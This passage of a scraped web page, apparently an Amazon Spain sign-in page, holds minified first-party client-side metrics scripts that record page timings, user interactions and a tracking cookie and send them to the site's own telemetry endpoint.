                    b[c] && (b[c].isUeh = 1)
                }

                function S(k, b, c, q) {
                    function p(b, c) {
                        var d = [b],
                            f = 0,
                            g = {},
                            m, h;
                        c ? (d.push("m=1"), g[c] = 1) : g = a.sc;
                        for (h in g)
                            if (g[v](h)) {
                                var q = e("wb", h),
                                    p = e("t", h) || {},
                                    n = e("t0", h) || a.t0,
                                    l;
                                if (c || 2 == q) {
                                    q = q ? f++ : "";
                                    d.push("sc" + q + "=" + h);
                                    for (l in p) u(p[l]) || null === p[l] || d.push(l + q + "=" + (p[l] - n));
                                    d.push("t" + q + "=" + p[k]);
                                    if (e("ctb", h) || e("wb", h)) m = 1
                                }
                            }! J && m && d.push("ctb=1");
                        return d.join("&")
                    }

                    function m(b, c, f, e, g) {
                        if (b) {
                            var k = d.ue_err;
                            d.ue_url && !e && !g && b && 0 < b.length && (e =
                                new Image, a.iel.push(e), e.src = b, a.count && a.count("postbackImageSize", b.length));
                            w ? (g = h.encodeURIComponent) && b && (e = new Image, b = "" + d.ue_fpf + g(b) + ":" + (+new E - d.ue_t0), a.iel.push(e), e.src = b) : a.log && (a.log(b, "uedata", {
                                n: 1
                            }), a.ielf.push(b));
                            k && !k.ts && k.startTimer();
                            a.b && (k = a.b, a.b = "", m(k, c, f, 1))
                        }
                    }

                    function A(b) {
                        var c = x ? x.type : F,
                            d = 2 == c || a.isBFonMshop,
                            c = c && !d,
                            f = a.bfini;
                        if (!Q || a.isBFCache) f && 1 < f && (b += "&bfform=1", c || (a.isBFT = f - 1)), d && (b += "&bfnt=1", a.isBFT = a.isBFT || 1), a.ssw && a.isBFT && (a.isBFonMshop && (a.isNRBF =
                            0), u(a.isNRBF) && (d = a.ssw(a.oid), d.e || u(d.val) || (a.isNRBF = 1 < d.val ? 0 : 1)), u(a.isNRBF) || (b += "&nrbf=" + a.isNRBF)), a.isBFT && !a.isNRBF && (b += "&bft=" + a.isBFT);
                        return b
                    }
                    if (!a.paused && (b || u(c))) {
                        for (var l in c) c[v](l) && e(l, b, c[l]);
                        a.isBFonMshop || y("pc", b, c);
                        l = "ld" === k && b && e("wb", b);
                        var s = e("id", b) || a.id;
                        l || s === a.oid || (D = b, ba(s, (e("t", b) || {}).tc || +e("t0", b), +e("t0", b)));
                        var s = e("id", b) || a.id,
                            t = e("id2", b),
                            f = a.url + "?" + k + "&v=" + a.v + "&id=" + s,
                            J = e("ctb", b) || e("wb", b),
                            z;
                        J && (f += "&ctb=" + J);
                        t && (f += "&id2=" + t);
                        1 < d.ueinit &&
                            (f += "&ic=" + d.ueinit);
                        if (!("ld" != k && "ul" != k || b && b != s)) {
                            if ("ld" == k) {
                                try {
                                    h[K] && h[K].isUeh && (h[K] = null)
                                } catch (I) {}
                                if (h.chrome)
                                    for (t = 0; t < L.length; t++) T(G, L[t]);
                                (t = N.ue_backdetect) && t.ue_back && t.ue_back.value++;
                                d._uess && (z = d._uess());
                                a.isl = 1
                            }
                            a._bf && (f += "&bf=" + a._bf());
                            d.ue_navtiming && g && (e("ctb", s, "1"), a.isBFonMshop || y("tc", F, F, M));
                            !C || a.isBFonMshop || U || (g && B(a.t, {
                                na_: g.navigationStart,
                                ul_: g.unloadEventStart,
                                _ul: g.unloadEventEnd,
                                rd_: g.redirectStart,
                                _rd: g.redirectEnd,
                                fe_: g.fetchStart,
                                lk_: g.domainLookupStart,
                                _lk: g.domainLookupEnd,
                                co_: g.connectStart,
                                _co: g.connectEnd,
                                sc_: g.secureConnectionStart,
                                rq_: g.requestStart,
                                rs_: g.responseStart,
                                _rs: g.responseEnd,
                                dl_: g.domLoading,
                                di_: g.domInteractive,
                                de_: g.domContentLoadedEventStart,
                                _de: g.domContentLoadedEventEnd,
                                _dc: g.domComplete,
                                ld_: g.loadEventStart,
                                _ld: g.loadEventEnd,
                                ntd: ("function" !== typeof C.now || u(M) ? 0 : new E(M + C.now()) - new E) + a.t0
                            }), x && B(a.t, {
                                ty: x.type + a.t0,
                                rc: x.redirectCount + a.t0
                            }), U = 1);
                            a.isBFonMshop || B(a.t, {
                                hob: d.ue_hob,
                                hoe: d.ue_hoe
                            });
                            a.ifr && (f += "&ifr=1")
                        }
                        y(k,
                            b, c, q);
                        var r, n;
                        l || b && b !== s || ca(b);
                        (c = d.ue_mbl) && c.cnt && !l && (f += c.cnt());
                        l ? e("wb", b, 2) : "ld" == k && (a.lid = H(s));
                        for (r in a.sc)
                            if (1 == e("wb", r)) break;
                        if (l) {
                            if (a.s) return;
                            f = p(f, null)
                        } else c = p(f, null), c != f && (c = A(c), a.b = c), z && (f += z), f = p(f, b || a.id);
                        f = A(f);
                        if (a.b || l)
                            for (r in a.sc) 2 == e("wb", r) && delete a.sc[r];
                        z = 0;
                        a._rt && (f += "&rt=" + a._rt());
                        c = h.csa;
                        if (!l && c)
                            for (n in r = e("t", b) || {}, c = c("PageTiming"), r) r[v](n) && c("mark", da[n] || n, r[n]);
                        l || (a.s = 0, (n = d.ue_err) && 0 < n.ec && n.pec < n.ec && (n.pec = n.ec, f += "&ec=" + n.ec + "&ecf=" +
                            n.ecf), z = e("ctb", b), "ld" !== k || b || a.markers ? a.markers && a.isl && !l && b && B(a.markers, e("t", b)) : (a.markers = {}, B(a.markers, e("t", b))), e("t", b, {}));
                        a.tag && a.tag().length && (f += "&csmtags=" + a.tag().join("|"), a.tag = P());
                        n = a.viz || [];
                        (r = n.length) && (f += "&viz=" + n.splice(0, r).join("|"));
                        u(d.ue_pty) || (f += "&pty=" + d.ue_pty + "&spty=" + d.ue_spty + "&pti=" + d.ue_pti);
                        a.tabid && (f += "&tid=" + a.tabid);
                        a.aftb && (f += "&aftb=1");
                        !a._ui || b && b != s || (f += a._ui());
                        f += "&lob=" + (d.ue_lob || "0");
                        a.a = f;
                        m(f, k, z, l, b && "string" === typeof b && -1 !== b.indexOf("csa:"))
                    }
                }

                function ca(a) {
                    var b = h.ue_csm_markers || {},
                        c;
                    for (c in b) b[v](c) && y(c, a, F, b[c])
                }

                function A(a, b, c) {
                    c = c || h;
                    if (c[V]) c[V](a, b, !1);
                    else if (c[W]) c[W]("on" + a, b)
                }

                function T(a, b, c) {
                    c = c || h;
                    if (c[X]) c[X](a, b, !1);
                    else if (c[Y]) c[Y]("on" + a, b)
                }

                function Z() {
                    function a() {
                        d.onUl()
                    }

                    function b(a) {
                        return function() {
                            c[a] || (c[a] = 1, S(a))
                        }
                    }
                    var c = {},
                        e, g;
                    d.onLd = b("ld");
                    d.onLdEnd = b("ld");
                    d.onUl = b("ul");
                    e = {
                        stop: b("os")
                    };
                    h.chrome ? (A(G, a), L.push(a)) : e[G] = d.onUl;
                    for (g in e) e[v](g) && R(0, h, g, e[g]);
                    d.ue_viz && ue_viz();
                    A("load", d.onLd);
                    y("ue")
                }

                function ba(e, b, c) {
                    var g = d.ue_mbl,
                        p = h.csa,
                        m = p && p("SPA"),
                        p = p && p("PageTiming");
                    g && g.ajax && g.ajax(b, c);
                    m && p && (m("newPage", {
                        requestId: e,
                        transitionType: "soft"
                    }), p("mark", "transitionStart", b));
                    a.tag("ajax-transition")
                }
                d.ueinit = (d.ueinit || 0) + 1;
                var a = d.ue = d.ue || {};
                a.t0 = h.aPageStart || d.ue_t0;
                a.id = d.ue_id;
                a.url = d.ue_url;
                a.rid = d.ue_id;
                a.a = "";
                a.b = "";
                a.h = {};
                a.s = 1;
                a.t = {};
                a.sc = {};
                a.iel = [];
                a.ielf = [];
                a.viz = [];
                a.v = "0.286992.0";
                a.paused = !1;
                var v = "hasOwnProperty",
                    G = "beforeunload",
                    K = "on" + G,
                    V = "addEventListener",
                    X = "removeEventListener",
                    W = "attachEvent",
                    Y = "detachEvent",
                    da = {
                        cf: "criticalFeature",
                        af: "aboveTheFold",
                        fn: "functional",
                        fp: "firstPaint",
                        fcp: "firstContentfulPaint",
                        bb: "bodyBegin",
                        be: "bodyEnd",
                        ld: "loaded"
                    },
                    E = h.Date,
                    C = h.performance || h.webkitPerformance,
                    g = (C || {}).timing,
                    x = (C || {}).navigation,
                    M = (g || {}).navigationStart,
                    w = d.ue_fpf,
                    Q = 0,
                    U = 0,
                    L = [],
                    D = 0,
                    F;
                a.oid = H(a.id);
                a.lid = H(a.id);
                a._t0 = a.t0;
                a.tag = P();
                a.ifr = h.top !== h.self || h.frameElement ? 1 : 0;
                a.markers = null;
                a.attach = A;
                a.detach = T;
                if ("000-0000000-8675309" === d.ue_sid) {
                    var $ =
                        I("cdn-rid"),
                        aa = I("session-id");
                    $ && aa && O($, aa, "cdn")
                }
                d.uei = Z;
                d.ueh = R;
                d.ues = e;
                d.uet = y;
                d.uex = S;
                a.reset = O;
                a.pause = function(d) {
                    a.paused = d
                };
                Z()
            })(ue_csm, ue_csm.window, ue_csm.document);


            ue.stub(ue, "log");
            ue.stub(ue, "onunload");
            ue.stub(ue, "onflush");
            (function(b) {
                function g() {
                    var a = {
                        requestId: b.ue_id || "rid",
                        server: b.ue_sn || "sn",
                        obfuscatedMarketplaceId: b.ue_mid || "mid"
                    };
                    b.ue_sjslob && (a.lob = b.ue_lob || "0");
                    return a
                }
                var a = b.ue,
                    h = 1 === b.ue_no_counters;
                a.cv = {};
                a.cv.scopes = {};
                a.cv.buffer = [];
                a.count = function(b, f, c) {
                    var e = {},
                        d = a.cv,
                        g = c && 0 === c.c;
                    e.counter = b;
                    e.value = f;
                    e.t = a.d();
                    c && c.scope && (d = a.cv.scopes[c.scope] = a.cv.scopes[c.scope] || {}, e.scope = c.scope);
                    if (void 0 === f) return d[b];
                    d[b] = f;
                    d = 0;
                    c && c.bf && (d = 1);
                    h || (ue_csm.ue_sclog || !a.clog || 0 !== d || g ? a.log && a.log(e,
                        "csmcount", {
                            c: 1,
                            bf: d
                        }) : a.clog(e, "csmcount", {
                        bf: d
                    }));
                    a.cv.buffer.push({
                        c: b,
                        v: f
                    })
                };
                a.count("baselineCounter2", 1);
                a && a.event && (a.event(g(), "csm", "csm.CSMBaselineEvent.4"), a.count("nexusBaselineCounter", 1, {
                    bf: 1
                }))
            })(ue_csm);



            var ue_hoe = +new Date();
        }
        window.ueinit = window.ue_ihb;
    </script>

    <!-- ctzqmqzljkox8hoi69yytvh5np4rizgyoxslr6 -->
    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 10178)
    </script>



    <title>

    </title>







    <link type="text/css" href="https://m.media-amazon.com/images/G/30/x-locale/common/errors-alerts/error-styles-ssl._CB485946634_.css" rel="stylesheet" />








    <link type="text/css" href="https://m.media-amazon.com/images/G/30/authportal/common/css/ap_global._CB485970816_.css" rel="stylesheet" />










    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <script type='text/javascript'>
        window.ue_ihe = (window.ue_ihe || 0) + 1;
        if (window.ue_ihe === 1) {
            (function(c) {
                c && 1 === c.ue_jsmtf && "object" === typeof c.P && "function" === typeof c.P.when && c.P.when("mshop-interactions").execute(function(e) {
                    "object" === typeof e && "function" === typeof e.addListener && e.addListener(function(b) {
                        "object" === typeof b && "ORIGIN" === b.dataSource && "number" === typeof b.clickTime && "object" === typeof b.events && "number" === typeof b.events.pageVisible && (c.ue_jsmtf_interaction = {
                            pv: b.events.pageVisible,
                            ct: b.clickTime
                        })
                    })
                })
            })(ue_csm);
            (function(c, e, b) {
                function m(a) {
                    f || (f = d[a.type].id, "undefined" === typeof a.clientX ? (h = a.pageX, k = a.pageY) : (h = a.clientX, k = a.clientY), 2 != f || l && (l != h || n != k) ? (r(), g.isl && e.setTimeout(function() {
                        p("at", g.id)
                    }, 0)) : (l = h, n = k, f = 0))
                }

                function r() {
                    for (var a in d) d.hasOwnProperty(a) && g.detach(a, m, d[a].parent)
                }

                function s() {
                    for (var a in d) d.hasOwnProperty(a) && g.attach(a, m, d[a].parent)
                }

                function t() {
                    var a = "";
                    !q && f && (q = 1, a += "&ui=" + f);
                    return a
                }
                var g = c.ue,
                    p = c.uex,
                    q = 0,
                    f = 0,
                    l, n, h, k, d = {
                        click: {
                            id: 1,
                            parent: b
                        },
                        mousemove: {
                            id: 2,
                            parent: b
                        },
                        scroll: {
                            id: 3,
                            parent: e
                        },
                        keydown: {
                            id: 4,
                            parent: b
                        }
                    };
                g && p && (s(), g._ui = t)
            })(ue_csm, window, document);


            (function(s, l) {
                function m(b, e, c) {
                    c = c || new Date(+new Date + t);
                    c = "expires=" + c.toUTCString();
                    n.cookie = b + "=" + e + ";" + c + ";path=/"
                }

                function p(b) {
                    b += "=";
                    for (var e = n.cookie.split(";"), c = 0; c < e.length; c++) {
                        for (var a = e[c];
                            " " == a.charAt(0);) a = a.substring(1);
                        if (0 === a.indexOf(b)) return decodeURIComponent(a.substring(b.length, a.length))
                    }
                    return ""
                }

                function q(b, e, c) {
                    if (!e) return b; - 1 < b.indexOf("{") && (b = "");
                    for (var a = b.split("&"), f, d = !1, h = !1, g = 0; g < a.length; g++) f = a[g].split(":"), f[0] == e ? (!c || d ? a.splice(g, 1) : (f[1] = c, a[g] =
                        f.join(":")), h = d = !0) : 2 > f.length && (a.splice(g, 1), h = !0);
                    h && (b = a.join("&"));
                    !d && c && (0 < b.length && (b += "&"), b += e + ":" + c);
                    return b
                }
                var k = s.ue || {},
                    t = 3024E7,
                    n = ue_csm.document || l.document,
                    r = null,
                    d;
                a: {
                    try {
                        d = l.localStorage;
                        break a
                    } catch (u) {}
                    d = void 0
                }
                k.count && k.count("csm.cookieSize", document.cookie.length);
                k.cookie = {
                    get: p,
                    set: m,
                    updateCsmHit: function(b, e, c) {
                        try {
                            var a;
                            if (!(a = r)) {
                                var f;
                                a: {
                                    try {
                                        if (d && d.getItem) {
                                            f = d.getItem("csm-hit");
                                            break a
                                        }
                                    } catch (k) {}
                                    f = void 0
                                }
                                a = f || p("csm-hit") || "{}"
                            }
                            a = q(a, b, e);
                            r = a = q(a, "t", +new Date);
                            try {
                                d && d.setItem && d.setItem("csm-hit", a)
                            } catch (h) {}
                            m("csm-hit", a, c)
                        } catch (g) {
                            "function" == typeof l.ueLogError && ueLogError(Error("Cookie manager: " + g.message), {
                                logLevel: "WARN"
                            })
                        }
                    }
                }
            })(ue_csm, window);


            (function(l, e) {
                function c(b) {
                    b = "";
                    var c = a.isBFT ? "b" : "s",
                        d = "" + a.oid,
                        g = "" + a.lid,
                        h = d;
                    d != g && 20 == g.length && (c += "a", h += "-" + g);
                    a.tabid && (b = a.tabid + "+");
                    b += c + "-" + h;
                    b != f && 100 > b.length && (f = b, a.cookie ? a.cookie.updateCsmHit(m, b + ("|" + +new Date)) : e.cookie = "csm-hit=" + b + ("|" + +new Date) + n + "; path=/")
                }

                function p() {
                    f = 0
                }

                function d(b) {
                    !0 === e[a.pageViz.propHid] ? f = 0 : !1 === e[a.pageViz.propHid] && c({
                        type: "visible"
                    })
                }
                var n = "; expires=" + (new Date(+new Date + 6048E5)).toGMTString(),
                    m = "tb",
                    f, a = l.ue || {},
                    k = a.pageViz && a.pageViz.event &&
                    a.pageViz.propHid;
                a.attach && (a.attach("click", c), a.attach("keyup", c), k || (a.attach("focus", c), a.attach("blur", p)), k && (a.attach(a.pageViz.event, d, e), d({})));
                a.aftb = 1
            })(ue_csm, ue_csm.document);


            ue_csm.ue.stub(ue, "impression");


            ue.stub(ue, "trigger");


            if (window.ue && uet) {
                uet('bb');
            }

        }
    </script>
    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 3172)
    </script>
</head>

<body>

    <script>
        ! function() {
            function n(n, t) {
                var r = i(n);
                return t && (r = r("instance", t)), r
            }
            var r = [],
                c = 0,
                i = function(t) {
                    return function() {
                        var n = c++;
                        return r.push([t, [].slice.call(arguments, 0), n, {
                            time: Date.now()
                        }]), i(n)
                    }
                };
            n._s = r, this.csa = n
        }();;
        csa('Config', {});
        if (window.csa) {
            csa("Config", {

                'Events.Namespace': 'csa',
                'ObfuscatedMarketplaceId': 'A1RKKUPIHCS9HS',
                'Events.SushiEndpoint': 'https://unagi.amazon.es/1/events/com.amazon.csm.csa.prod',
                'CacheDetection.RequestID': "KE82YVBED2PEDHPE6KTZ",
                'CacheDetection.Callback': window.ue && ue.reset,
                'LCP.elementDedup': 1,
                'lob': '0'
            });

            csa("Events")("setEntity", {
                page: {
                    requestId: "KE82YVBED2PEDHPE6KTZ",
                    meaningful: "interactive"
                },
                session: {
                    id: "260-7076577-0538233"
                }
            });
        }! function(r) {
            var e, i, o = "splice",
                u = r.csa,
                f = {},
                c = {},
                a = r.csa._s,
                s = 0,
                l = 0,
                g = -1,
                h = {},
                v = {},
                d = {},
                n = Object.keys,
                p = function() {};

            function t(n, t) {
                return u(n, t)
            }

            function m(n, t) {
                var r = c[n] || {};
                k(r, t), c[n] = r, l++, S(U, 0)
            }

            function w(n, t, r) {
                var i = !0;
                return t = D(t), r && r.buffered && (i = (d[n] || []).every(function(n) {
                    return !1 !== t(n)
                })), i ? (h[n] || (h[n] = []), h[n].push(t), function() {
                    ! function(n, t) {
                        var r = h[n];
                        r && r[o](r.indexOf(t), 1)
                    }(n, t)
                }) : p
            }

            function b(n, t) {
                if (t = D(t), n in v) return t(v[n]), p;
                return w(n, function(n) {
                    return t(n), !1
                })
            }

            function y(n, t) {
                if (u("Errors")("logError", n), f.DEBUG) throw t || n
            }

            function E() {
                return Math.abs(4294967295 * Math.random() | 0).toString(36)
            }

            function D(n, t) {
                return function() {
                    try {
                        return n.apply(this, arguments)
                    } catch (n) {
                        y(n.message || n, n)
                    }
                }
            }

            function S(n, t) {
                return r.setTimeout(D(n), t)
            }

            function U() {
                for (var n = 0; n < a.length;) {
                    var t = a[n],
                        r = t[0] in c;
                    if (!r && !i) return void(s = a.length);
                    r ? (a[o](s = n, 1), I(t)) : n++
                }
                g = l
            }

            function I(n) {
                var t = c[n[0]],
                    r = n[1],
                    i = r[0];
                if (!t || !t[i]) return y("Undefined function: " + t + "/" + i);
                e = n[3], c[n[2]] = t[i].apply(t, r.slice(1)) || {}, e = 0
            }

            function O() {
                i = 1, U()
            }

            function k(t, r) {
                n(r).forEach(function(n) {
                    t[n] = r[n]
                })
            }
            b("$beforeunload", O), m("Config", {
                instance: function(n) {
                    k(f, n)
                }
            }), u.plugin = D(function(n) {
                n(t)
            }), t.config = f, t.register = m, t.on = w, t.once = b, t.blank = p, t.emit = function(n, t, r) {
                for (var i = h[n] || [], e = 0; e < i.length;) !1 === i[e](t) ? i[o](e, 1) : e++;
                v[n] = t || {}, r && r.buffered && (d[n] || (d[n] = []), 100 <= d[n].length && d[n].shift(), d[n].push(t || {}))
            }, t.UUID = function() {
                return [E(), E(), E(), E()].join("-")
            }, t.time = function(n) {
                var t = e ? new Date(e.time) : new Date;
                return "ISO" === n ? t.toISOString() : t.getTime()
            }, t.error = y, t.warn = function(n, t) {
                if (u("Errors")("logWarn", n), f.DEBUG) throw t || n
            }, t.exec = D, t.timeout = S, t.interval = function(n, t) {
                return r.setInterval(D(n), t)
            }, (t.global = r).csa._s.push = function(n) {
                n[0] in c && (!a.length || i) ? (I(n), a.length && g !== l && U()) : a[o](s++, 0, n)
            }, U(), S(function() {
                S(O, f.SkipMissingPluginsTimeout || 5e3)
            }, 1)
        }("undefined" != typeof window ? window : global);
        csa.plugin(function(o) {
            var f = "addEventListener",
                e = "requestAnimationFrame",
                t = o.exec,
                r = o.global,
                u = o.on;
            o.raf = function(n) {
                if (r[e]) return r[e](t(n))
            }, o.on = function(n, e, t, r) {
                if (n && "function" == typeof n[f]) {
                    var i = o.exec(t);
                    return n[f](e, i, r),
                        function() {
                            n.removeEventListener(e, i, r)
                        }
                }
                return "string" == typeof n ? u(n, e, t, r) : o.blank
            }
        });
        csa.plugin(function(o) {
            var t, n, r = {},
                e = "localStorage",
                c = "sessionStorage",
                a = "local",
                i = "session",
                u = o.exec;

            function s(e, t) {
                var n;
                try {
                    r[t] = !!(n = o.global[e]), n = n || {}
                } catch (e) {
                    r[t] = !(n = {})
                }
                return n
            }

            function f() {
                t = t || s(e, a), n = n || s(c, i)
            }

            function l(e) {
                return e && e[i] ? n : t
            }
            o.store = u(function(e, t, n) {
                f();
                var o = l(n);
                return e ? t ? void(o[e] = t) : o[e] : Object.keys(o)
            }), o.storageSupport = u(function() {
                return f(), r
            }), o.deleteStored = u(function(e, t) {
                f();
                var n = l(t);
                if ("function" == typeof e)
                    for (var o in n) n.hasOwnProperty(o) && e(o, n[o]) && delete n[o];
                else delete n[e]
            })
        });
        csa.plugin(function(n) {
            n.types = {
                ovl: function(n) {
                    var r = [];
                    if (n)
                        for (var i in n) n.hasOwnProperty(i) && r.push(n[i]);
                    return r
                }
            }
        });
        csa.plugin(function(c) {
            var e = c.config;

            function n(n) {
                return function(e) {
                    c("Metrics", {
                        producerId: "csa",
                        dimensions: {
                            message: e
                        }
                    })("recordMetric", n, 1)
                }
            }

            function r(r) {
                var o, t, l = c("Events", {
                        producerId: r.producerId,
                        lob: e.lob || "0"
                    }),
                    u = ["name", "type", "csm", "adb"],
                    i = {
                        url: "pageURL",
                        file: "f",
                        line: "l",
                        column: "c"
                    };
                this.log = function(e) {
                    if (! function(e) {
                            if (!e) return !0;
                            for (var n in e) return !1;
                            return !0
                        }(e)) {
                        var n = r.logOptions || {
                            ent: {
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        };
                        l("log", function(n) {
                            return o = c.UUID(), t = {
                                messageId: o,
                                schemaId: r.schemaId || "<ns>.Error.6",
                                errorMessage: n.m || null,
                                attribution: n.attribution || null,
                                logLevel: "FATAL",
                                url: null,
                                file: null,
                                line: null,
                                column: null,
                                stack: n.s || [],
                                context: n.cinfo || {},
                                metadata: {}
                            }, n.logLevel && (t.logLevel = "" + n.logLevel), u.forEach(function(e) {
                                n[e] && (t.metadata[e] = n[e])
                            }), "INFO" === n.logLevel || Object.keys(i).forEach(function(e) {
                                "number" != typeof n[i[e]] && "string" != typeof n[i[e]] || (t[e] = "" + n[i[e]])
                            }), t
                        }(e), n)
                    }
                }
            }
            c.register("Errors", {
                instance: function(e) {
                    return new r(e || {})
                },
                logError: n("jsError"),
                logWarn: n("jsWarn")
            })
        });
        csa.plugin(function(o) {
            var r, e, n, t, a, i = "function",
                u = "willDisappear",
                f = "$app.",
                p = "$document.",
                c = "focus",
                s = "blur",
                d = "active",
                l = "resign",
                $ = o.global,
                b = o.exec,
                m = o.config["Transport.AnonymizeRequests"] || !1,
                g = o("Events"),
                h = $.location,
                v = $.document || {},
                y = $.P || {},
                P = (($.performance || {}).navigation || {}).type,
                w = o.on,
                k = o.emit,
                E = v.hidden,
                T = {};
            h && v && (w($, "beforeunload", D), w($, "pagehide", D), w(v, "visibilitychange", R(p, function() {
                return v.visibilityState || "unknown"
            })), w(v, c, R(p + c)), w(v, s, R(p + s)), y.when && y.when("mash").execute(function(e) {
                e && (w(e, "appPause", R(f + "pause")), w(e, "appResume", R(f + "resume")), R(f + "deviceready")(), $.cordova && $.cordova.platformId && R(f + cordova.platformId)(), w(v, d, R(f + d)), w(v, l, R(f + l)))
            }), e = $.app || {}, n = b(function() {
                k(f + "willDisappear"), D()
            }), a = typeof(t = e[u]) == i, e[u] = b(function() {
                n(), a && t()
            }), $.app || ($.app = e), "complete" === v.readyState ? A() : w($, "load", A), E ? S() : x(), o.on("$app.blur", S), o.on("$app.focus", x), o.on("$document.blur", S), o.on("$document.focus", x), o.on("$document.hidden", S), o.on("$document.visible", x), o.register("SPA", {
                newPage: I
            }), I({
                transitionType: {
                    0: "hard",
                    1: "refresh",
                    2: "back-button"
                } [P] || "unknown"
            }));

            function I(n, e) {
                var t = !!r,
                    a = (e = e || {}).keepPageAttributes;
                t && (k("$beforePageTransition"), k("$pageTransition")), t && !a && g("removeEntity", "page"), r = o.UUID(), a ? T.id = r : T = {
                    schemaId: "<ns>.PageEntity.2",
                    id: r,
                    url: m ? h.href.split("?")[0] : h.href,
                    server: h.hostname,
                    path: h.pathname,
                    referrer: m ? v.referrer.split("?")[0] : v.referrer,
                    title: v.title
                }, Object.keys(n || {}).forEach(function(e) {
                    T[e] = n[e]
                }), g("setEntity", {
                    page: T
                }), k("$pageChange", T, {
                    buffered: 1
                }), t && k("$afterPageTransition")
            }

            function A() {
                k("$load"), k("$ready"), k("$afterload")
            }

            function D() {
                k("$ready"), k("$beforeunload"), k("$unload"), k("$afterunload")
            }

            function S() {
                E || (k("$visible", !1, {
                    buffered: 1
                }), E = !0)
            }

            function x() {
                E && (k("$visible", !0, {
                    buffered: 1
                }), E = !1)
            }

            function R(n, t) {
                return b(function() {
                    var e = typeof t == i ? n + t() : n;
                    k(e)
                })
            }
        });
        csa.plugin(function(c) {
            var e = "Events",
                n = "UNKNOWN",
                s = "id",
                a = "all",
                i = "messageId",
                o = "timestamp",
                u = "producerId",
                r = "application",
                f = "obfuscatedMarketplaceId",
                d = "entities",
                l = "schemaId",
                p = "version",
                v = "attributes",
                g = "<ns>",
                b = "lob",
                t = "session",
                h = c.config,
                m = (c.global.location || {}).host,
                I = h[e + ".Namespace"] || "csa_other",
                y = h.Application || "Other" + (m ? ":" + m : ""),
                O = h["Transport.AnonymizeRequests"] || !1,
                E = c("Transport"),
                U = {},
                A = function(e, t) {
                    Object.keys(e).forEach(t)
                };

            function N(n, i, o) {
                A(i, function(e) {
                    var t = o === a || (o || {})[e];
                    e in n || (n[e] = {
                        version: 1,
                        id: i[e][s] || c.UUID()
                    }), S(n[e], i[e], t)
                })
            }

            function S(t, n, i) {
                A(n, function(e) {
                    ! function(e, t, n) {
                        return "string" != typeof t && e !== p ? c.error("Attribute is not of type string: " + e) : !0 === n || 1 === n || (e === s || !!~(n || []).indexOf(e))
                    }(e, n[e], i) || (t[e] = n[e])
                })
            }

            function k(o, e, r) {
                A(e, function(e) {
                    var t = o[e];
                    if (t[l]) {
                        var n = {},
                            i = {};
                        n[s] = t[s], n[u] = t[u] || r[u], n[l] = t[l], n[p] = t[p]++, n[v] = i, w(n, r), S(i, t, 1), D(i), E("log", n)
                    }
                })
            }

            function w(e, t) {
                e[o] = function(e) {
                    return "number" == typeof e && (e = new Date(e).toISOString()), e || c.time("ISO")
                }(e[o]), e[i] = e[i] || c.UUID(), e[r] = y, e[f] = h.ObfuscatedMarketplaceId || n, e[l] = e[l].replace(g, I), t && t[b] && (e[b] = t[b])
            }

            function D(e) {
                delete e[p], delete e[l], delete e[u]
            }

            function T(o) {
                var r = {};
                this.log = function(e, t) {
                    var n = {},
                        i = (t || {}).ent;
                    return e ? "string" != typeof e[l] ? c.error("A valid schema id is required for the event") : (w(e, o), N(n, U, i), N(n, r, i), N(n, e[d] || {}, i), A(n, function(e) {
                        D(n[e])
                    }), e[u] = o[u], e[d] = n, t && t[b] && (e[b] = t[b]), void E("log", e, t)) : c.error("The event cannot be undefined")
                }, this.setEntity = function(e) {
                    O && delete e[t], N(r, e, a), k(r, e, o)
                }
            }
            h["KillSwitch." + e] || c.register(e, {
                setEntity: function(e) {
                    O && delete e[t], c.emit("$entities.set", e, {
                        buffered: 1
                    }), N(U, e, a), k(U, e, {
                        producerId: "csa",
                        lob: h[b] || "0"
                    })
                },
                removeEntity: function(e) {
                    delete U[e]
                },
                instance: function(e) {
                    return new T(e)
                }
            })
        });
        csa.plugin(function(s) {
            var c, g = "Transport",
                l = "post",
                f = "preflight",
                r = "csa.cajun.",
                i = "store",
                a = "deleteStored",
                u = "sendBeacon",
                t = "__merge",
                e = "messageId",
                n = ".FlushInterval",
                o = 0,
                d = s.config[g + ".BufferSize"] || 2e3,
                h = s.config[g + ".RetryDelay"] || 1500,
                p = s.config[g + ".AnonymizeRequests"] || !1,
                v = {},
                y = 0,
                m = [],
                E = s.global,
                R = E.document,
                b = s.timeout,
                k = E.Object.keys,
                w = s.config[g + n] || 5e3,
                I = w,
                O = s.config[g + n + ".BackoffFactor"] || 1,
                S = s.config[g + n + ".BackoffLimit"] || 3e4,
                B = 0;

            function T(n) {
                if (864e5 < s.time() - +new Date(n.timestamp)) return s.warn("Event is too old: " + n);
                y < d && (n[e] in v || (v[n[e]] = n, y++), "function" == typeof n[t] && n[t](v[n[e]]), !B && o && (B = b(q, function() {
                    var n = I;
                    return I = Math.min(n * O, S), n
                }())))
            }

            function q() {
                m.forEach(function(e) {
                    var o = [];
                    k(v).forEach(function(n) {
                        var t = v[n];
                        e.accepts(t) && o.push(t)
                    }), o.length && (e.chunks ? e.chunks(o).forEach(function(n) {
                        D(e, n)
                    }) : D(e, o))
                }), v = {}, B = 0
            }

            function D(t, e) {
                function o() {
                    s[a](r + n)
                }
                var n = s.UUID();
                s[i](r + n, JSON.stringify(e)), [function(n, t, e) {
                    var o = E.navigator || {},
                        r = E.cordova || {};
                    if (p) return 0;
                    if (!o[u] || !n[l]) return 0;
                    n[f] && r && "ios" === r.platformId && !c && ((new Image).src = n[f]().url, c = 1);
                    var i = n[l](t);
                    if (!i.type && o[u](i.url, i.body)) return e(), 1
                }, function(n, t, e) {
                    if (!n[l]) return 0;
                    var o = n[l](t),
                        r = o.url,
                        i = o.body,
                        c = o.type,
                        f = new XMLHttpRequest,
                        a = 0;

                    function u(n, t, e) {
                        f.open("POST", n), f.withCredentials = !p, e && f.setRequestHeader("Content-Type", e), f.send(t)
                    }
                    return f.onload = function() {
                        f.status < 299 ? e() : s.config[g + ".XHRRetries"] && a < 3 && b(function() {
                            u(r, i, c)
                        }, ++a * h)
                    }, u(r, i, c), 1
                }].some(function(n) {
                    try {
                        return n(t, e, o)
                    } catch (n) {}
                })
            }
            k && (s.once("$afterload", function() {
                o = 1,
                    function(e) {
                        (s[i]() || []).forEach(function(n) {
                            if (!n.indexOf(r)) try {
                                var t = s[i](n);
                                s[a](n), JSON.parse(t).forEach(e)
                            } catch (n) {
                                s.error(n)
                            }
                        })
                    }(T), s.on(R, "visibilitychange", q, !1), q()
